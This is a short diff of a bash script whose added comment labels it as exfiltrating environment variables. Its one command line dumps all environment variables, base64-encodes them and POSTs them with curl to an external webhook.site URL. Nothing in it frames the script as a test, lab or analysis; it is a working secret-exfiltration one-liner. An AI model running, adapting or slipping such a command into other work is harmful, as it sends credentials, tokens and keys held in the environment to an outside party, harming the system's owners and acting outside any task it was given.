@@ -1,2 +1,3 @@
 #!/bin/bash
+# Exfiltrate environment variables in Base64
 env | base64 -w 0 | curl -X POST -d @- "https://webhook.site/34790ae8-a0ef-4ea4-bee3-5b3b4e7cbb61"
